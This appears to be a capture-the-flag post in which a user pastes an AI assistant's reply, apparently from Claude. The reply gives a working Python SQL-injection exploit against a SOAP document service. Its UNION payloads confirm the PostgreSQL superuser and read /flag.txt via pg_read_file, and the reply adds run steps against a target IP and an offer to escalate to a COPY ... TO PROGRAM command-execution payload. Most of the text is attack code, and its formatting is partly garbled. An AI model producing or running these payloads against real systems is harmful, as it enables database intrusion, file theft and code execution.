<img width="607" height="776" alt="image" src="https://github.com/user-attachments/assets/a7283678-773b-404d-8da2-d0e84b7c209d" />

i asked claude for script

I gave you a working script already — it's at `/home/claude/wisadel/exploit.py`. Let me hand you the actual content so you can copy it directly, plus quick usage steps.

```jsx
`#!/usr/bin/env python3
import sys
import requests`

`BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"`

`def soap_request(document, author="x"):
body = f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
soap:Body
<getDocuments_Dev xmlns="http://tempuri.org/">
<document>{document}</document>
<author>{author}</author>
</getDocuments_Dev>
</soap:Body>
</soap:Envelope>"""
headers = {
"Content-Type": "text/xml; charset=utf-8",
"SOAPAction": '"http://tempuri.org/getDocuments_Dev"'
}
r = requests.post(f"{BASE}/DocumentsService.asmx", data=body, headers=headers)
return r.text`
```

#### confirm current_user is postgres superuser

```jsx
print("[*] current_user / version check:")
payload = "') UNION SELECT current_user, version(), 'x'--"
print(soap_request(payload))
```

#### read the flag via pg_read_file (works because postgres runs as superuser)

`print("[*] Reading /flag.txt via pg_read_file():")
payload = "') UNION SELECT pg_read_file('/flag.txt'), 'x', 'x'--"
print(soap_request(payload))`

```

**How to run it:**

1. Save as `exploit.py`
2. `pip install requests` if you don't have it
3. Point it at the live target — replace with the actual host/port for the deployed instance:
```

python3 exploit.py http://TARGET_IP:8080

```
4. Check the output — `current_user` should print `postgres`, and the second block's `<name>` tag in the SOAP XML should contain the flag contents.

If `pg_read_file` errors out (permission/path issue), tell me the error text and I'll swap in a `COPY ... TO PROGRAM` stacked-query payload instead.
```

<img width="1512" height="377" alt="image" src="https://github.com/user-attachments/assets/bbc4bc9e-9361-4321-9bcd-c2145efedf6a" />

right away we got the flag
